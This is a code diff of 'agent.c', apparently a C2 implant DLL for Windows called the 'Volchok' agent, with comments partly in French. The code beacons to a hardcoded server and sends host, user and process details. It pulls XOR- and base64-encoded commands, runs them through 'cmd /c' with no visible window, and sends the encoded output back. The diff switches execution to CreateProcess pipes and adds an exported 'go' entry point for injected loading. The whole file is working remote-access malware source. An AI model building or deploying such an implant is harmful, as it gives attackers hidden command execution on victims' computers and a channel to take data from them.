@@ -1,6 +1,5 @@
-// Fichier : agent.c
 // compile with : x86_64-w64-mingw32-gcc -O2 -Wall -shared -o agent.dll agent.c -lwininet -lpsapi
-#define _CRT_SECURE_NO_WARNINGS // Pour VS warnings fopen/popen
+#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <wininet.h>
 #include <psapi.h>
@@ -15,13 +14,12 @@
 #define XOR_KEY "mysecretkey"
 #define XOR_KEYLEN (sizeof(XOR_KEY) - 1)
 #define USER_AGENT "Mozilla/5.0"
-#define HOSTNAME "192.168.66.14"
-#define PORT 80
+#define HOSTNAME "127.0.0.1"
+#define PORT 8080
 #define HEADER "Accept: application/json\r\n"
 #define PATH_API "/api"
 #define BEACON_INTERVAL 5
 
-// --- Helpers ---
 void wininet_error(const char* msg) {
     DWORD err = GetLastError();
     char buf[256];
@@ -34,7 +32,6 @@ void xor_data(char* data, size_t len, const char* key, size_t klen) {
         data[i] ^= key[i % klen];
 }
 
-// -- Base64 C pur --
 const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 void base64_encode(const unsigned char* input, size_t in_len, char* out, size_t out_size) {
     size_t olen = 0;
@@ -79,7 +76,6 @@ int base64_decode(const char* in, unsigned char* out, size_t out_size) {
     return outl;
 }
 
-// --- Infos système ---
 void get_hostname(char* out, DWORD len) {
     if (!GetComputerNameA(out, &len)) strcpy(out, "unknown_host");
 }
@@ -104,20 +100,51 @@ void generate_agent_id(char* out, size_t outlen) {
     snprintf(out, outlen, "%s_%s_%s", host, user, proc);
 }
 
-// --- Commande système ---
-void exec_cmd(const char* cmd, char* out, size_t outlen) {
-    out[0] = 0;
-    FILE* pipe = _popen(cmd, "r");
-    if (!pipe) {
-        snprintf(out, outlen, "Error opening pipe");
-        return;
+size_t exec_cmd(const char* cmd, char* output, size_t outsz) {
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    HANDLE readPipe = NULL, writePipe = NULL;
+
+    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
+        snprintf(output, outsz, "ERROR: CreatePipe failed");
+        return strlen(output);
     }
-    size_t len = 0;
-    while (fgets(out + len, (int)(outlen - len), pipe) && len < outlen - 1) len = strlen(out);
-    _pclose(pipe);
+
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = writePipe;
+    si.hStdError  = writePipe;
+
+    char cmdline[512];
+    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", cmd);
+
+    PROCESS_INFORMATION pi = {0};
+    BOOL ok = CreateProcessA(
+        NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
+        NULL, NULL, &si, &pi);
+    if (!ok) {
+        snprintf(output, outsz, "ERROR: CreateProcess failed");
+        CloseHandle(readPipe);
+        CloseHandle(writePipe);
+        return strlen(output);
+    }
+
+    CloseHandle(writePipe);
+    DWORD total = 0, read = 0;
+    while (total < outsz - 1 && ReadFile(readPipe, output + total, (DWORD)(outsz - 1 - total), &read, NULL) && read > 0) {
+        total += read;
+    }
+
+    output[total] = '\0'; // pour usage texte, même si ce n'est pas toujours garanti pour binaire
+
+    CloseHandle(readPipe);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return total;
 }
 
-// --- Parse tâches JSON réponse simple ---
 int parse_tasks(const char* json, char tasks[][1024], int max_tasks) {
     const char* p = strstr(json, "\"tasks\"");
     if (!p) return 0;
@@ -138,7 +165,6 @@ int parse_tasks(const char* json, char tasks[][1024], int max_tasks) {
     return nt;
 }
 
-// -- HTTP(s) POST + lecture data --
 int http_post(const char* host, int port, const char* path, const char* user_agent, const char* extra_headers, const char* data, char* response, size_t resp_len) {
     HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) { wininet_error("InternetOpenA failed"); return 0; }
@@ -152,7 +178,6 @@ int http_post(const char* host, int port, const char* path, const char* user_age
     BOOL res = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data));
     if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return 0; }
 
-    // Lecture réponse (optionnel, pour /api GET tasks)
     DWORD totalRead = 0, bytesRead;
     if (response) response[0] = 0;
     char temp[4096];
@@ -169,13 +194,11 @@ int http_post(const char* host, int port, const char* path, const char* user_age
     return 1;
 }
 
-// --- Agent principal / Beacon loop ---
 void agent_beacon() {
     char agent_id[512];
     generate_agent_id(agent_id, sizeof(agent_id));
 
     while (1) {
-        // --- POST pour récupérer les tâches
         char post_data[1024];
         char host[128] = "", user[128] = "", proc[128] = "";
         DWORD sz = 128;
@@ -188,31 +211,26 @@ void agent_beacon() {
         snprintf(post_data, sizeof(post_data),
             "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"process_name\":\"%s\"}",
             agent_id, host, user, proc);
-        // (pour éviter multi get_xxx, tu peux spécialiser !)
 
         char response[8192];
         int ok = http_post(HOSTNAME, PORT, PATH_API, USER_AGENT, HEADER, post_data, response, sizeof(response));
         if (!ok) continue;
 
-        // --- Décodage des tâches et exécution
         char tasks[8][1024];
         int num_tasks = parse_tasks(response, tasks, 8);
         for (int t = 0; t < num_tasks; t++) {
-            // base64_decode + XOR
             unsigned char decoded[1024] = {0};
             int dec_len = base64_decode(tasks[t], decoded, sizeof(decoded));
             xor_data((char*)decoded, dec_len, XOR_KEY, XOR_KEYLEN);
 
-            // exec_cmd
             char cmd_out[8192] = {0};
-            exec_cmd((char*)decoded, cmd_out, sizeof(cmd_out));
+            size_t outlen = exec_cmd((char*)decoded, cmd_out, sizeof(cmd_out));
 
-            // XOR + base64_encode retour
-            xor_data(cmd_out, strlen(cmd_out), XOR_KEY, XOR_KEYLEN);
+            xor_data(cmd_out, outlen, XOR_KEY, XOR_KEYLEN);
+
             char out_b64[16384] = { 0 };
-            base64_encode((unsigned char*)cmd_out, strlen(cmd_out), out_b64, sizeof(out_b64));
+            base64_encode((unsigned char*)cmd_out, outlen, out_b64, sizeof(out_b64));
 
-            // Construction JSON résultat + POST résultat
             char result_json[16384];
             snprintf(result_json, sizeof(result_json),
                 "{\"agent_id\":\"%s\",\"result\":\"%s\"}", agent_id, out_b64);
@@ -225,15 +243,9 @@ void agent_beacon() {
     }
 }
 
-// --- DLL Entrypoint ---
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID reserved) {
-    if (reason == DLL_PROCESS_ATTACH) {
-        // Optionnel : Exécuter automatiquement
-        // CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)agent_beacon, NULL, 0, NULL);
-    }
     return TRUE;
 }
-
 
 DWORD WINAPI agent_thread(LPVOID _) {
     agent_beacon();
@@ -242,7 +254,10 @@ DWORD WINAPI agent_thread(LPVOID _) {
 
 __declspec(dllexport)
 void go(void* param) {
-    // Lance le vrai agent en thread pour ne PAS bloquer le "host" (SRDI)
-    HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL);
-    if (h) CloseHandle(h);
+    MessageBoxA(NULL, "Hello depuis l'agent Volchok !", "agent.dll", MB_OK | MB_ICONINFORMATION);
+    HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL); 
+    if (h) {
+        WaitForSingleObject(h, INFINITE);
+        CloseHandle(h);
+    }
 }
